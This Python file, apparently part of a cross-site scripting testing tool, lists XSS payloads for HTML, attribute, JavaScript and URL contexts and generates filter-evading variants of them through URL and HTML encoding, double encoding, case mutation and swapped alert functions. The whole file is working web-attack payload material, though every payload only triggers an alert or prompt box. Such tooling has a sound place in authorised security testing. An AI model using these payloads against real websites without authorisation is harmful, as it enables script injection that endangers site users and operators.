# payload_engine.py

import urllib.parse
import html

# Base payloads for different contexts
BASE_PAYLOADS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "attribute": [
        '" onmouseover=alert(1) x="',
        "' onfocus=alert(1) x='",
        '" autofocus onfocus=prompt(1)"'
    ],
    "js": [
        "';alert(1);//",
        '");alert(1);//',
        "`);alert(1);//"
    ],
    "url": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>"
    ]
}

def mutate_payload(payload):
    variants=set()

    # raw
    variants.add(payload)

    # HTML encode
    variants.add(html.escape(payload))

    # URL encode
    variants.add(urllib.parse.quote(payload))

    # double URL encode
    variants.add(urllib.parse.quote(urllib.parse.quote(payload)))

    # mixed encoding < > to %3C %3E
    variants.add(payload.replace("<","%3C").replace(">","%3E"))

    # case mutation
    variants.add(payload.replace("script","ScRiPt"))

    # event mutation alert->confirm
    variants.add(payload.replace("alert","confirm"))
    variants.add(payload.replace("alert","prompt"))

    return variants

def generate_payloads():
    all_payloads=set()

    for context,payload_list in BASE_PAYLOADS.items():
        for p in payload_list:
            all_payloads.update(mutate_payload(p))

    return list(all_payloads)
